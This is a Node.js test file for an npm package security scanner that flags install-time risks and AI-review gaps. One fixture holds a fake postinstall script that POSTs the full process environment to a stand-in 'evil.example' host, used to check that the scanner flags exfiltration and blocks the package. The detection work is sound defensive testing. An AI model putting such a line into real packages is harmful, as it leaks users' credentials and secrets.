import test from "node:test";
import assert from "node:assert/strict";
import { analyzePackage, addAiUnavailableFinding } from "../src/analysis.js";
import { decideVerdict } from "../src/verdict.js";

function fakeSnapshot(manifest) {
  return {
    spec: { name: "sketchy", wanted: "latest" },
    manifest,
    packageCreatedAt: new Date().toISOString(),
    versionPublishedAt: new Date().toISOString(),
    downloads: { downloads: 7 },
  };
}

test("analysis detects install-time environment exfiltration", () => {
  const manifest = {
    name: "sketchy",
    version: "1.0.0",
    scripts: { postinstall: "node postinstall.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 3,
    totalUnpackedBytes: 1000,
    packageJson: manifest,
    selectedFiles: [
      {
        path: "postinstall.js",
        text: "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env) })",
        size: 96,
        truncated: false,
        reasons: ["postinstall script target"],
      },
    ],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  assert.equal(analysis.needsAi, true);
  const exfiltration = analysis.findings.find((finding) => finding.code === "possible_secret_exfiltration");
  assert.ok(exfiltration);
  assert.equal(exfiltration.evidence[0].line, 1);
  assert.match(exfiltration.evidence[0].excerpt, /process\.env/);
  assert.ok(analysis.findings.some((finding) => finding.code === "lifecycle_hook"));

  const verdict = decideVerdict(analysis, { status: "skipped" });
  assert.equal(verdict.verdict, "block");
});

test("missing AI review for lifecycle hooks becomes caution", () => {
  const manifest = {
    name: "cautious",
    version: "1.0.0",
    scripts: { postinstall: "node install.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [{ path: "install.js", text: "console.log('install')", size: 22, truncated: false, reasons: [] }],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  const withAiUnavailable = addAiUnavailableFinding(analysis, "not configured");
  const verdict = decideVerdict(withAiUnavailable, { status: "unavailable", reason: "not configured" });
  assert.equal(verdict.verdict, "caution");
  assert.ok(withAiUnavailable.findings.some((finding) => finding.code === "ai_unavailable"));
});

test("analysis reports established registry context without overriding findings", () => {
  const manifest = { name: "established", version: "2.0.0", scripts: {}, bin: "cli.js" };
  const snapshot = {
    ...fakeSnapshot(manifest),
    packageCreatedAt: "2018-01-01T00:00:00.000Z",
    versionPublishedAt: "2025-01-01T00:00:00.000Z",
    downloads: { downloads: 250_000 },
    profile: { maintainersCount: 3, repository: { github: "owner/repo" } },
  };
  const analysis = analyzePackage(snapshot, {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.equal(analysis.stats.trustContext.level, "established-signals");
  assert.ok(analysis.stats.trustContext.signals.includes("high weekly adoption"));
  assert.equal(analysis.findings.length, 0);
});


test("analysis does not combine distant unrelated entrypoint signals", () => {
  const manifest = { name: "noisy-bin", version: "1.0.0", scripts: {}, bin: "bin.js" };
  const distantText = `console.log("docs: https://example.com/help");
${"x".repeat(1200)}
require("child_process").execFileSync("node", ["worker.js"]);`;
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 2_000,
    packageJson: manifest,
    selectedFiles: [{
      path: "bin.js",
      text: distantText,
      size: distantText.length,
      truncated: false,
      reasons: ["bin entrypoint"],
    }],
  });

  assert.equal(analysis.findings.some((finding) => finding.code === "network_and_shell"), false);
});
